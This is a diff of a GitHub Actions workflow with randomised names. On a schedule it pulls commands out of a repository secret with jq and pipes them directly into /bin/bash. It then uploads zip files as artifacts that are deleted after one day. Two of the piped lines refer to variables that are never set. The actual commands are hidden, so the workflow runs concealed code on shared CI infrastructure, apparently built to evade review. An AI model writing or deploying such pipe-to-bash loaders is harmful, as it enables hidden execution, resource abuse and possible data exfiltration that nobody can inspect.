@@ -1,20 +1,25 @@
 name: timothybuild737
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '20 1/6 * * *'
+    - cron: '22 2,8,14,20 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: timothybuild737
         env:
-          bv6: ${{ secrets.bv6 }}
+          o879: ${{ secrets.o879 }}
         run: |
-          echo $bv6 | jq -r .kfjvr540 | /bin/bash
-          echo $gz7 | jq -r .gxflc59367 | /bin/bash
-          echo $cj6013 | jq -r .xhub823 | /bin/bash
+          printf '%s' "$o879" | jq -r .mlfc78 | /bin/bash
+          echo $nj163 | jq -r .jpa6 | /bin/bash
+          echo $pkkiy93665 | jq -r .u9 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: BdCzeHRa
+          path: "*.zip"
+          retention-days: 1
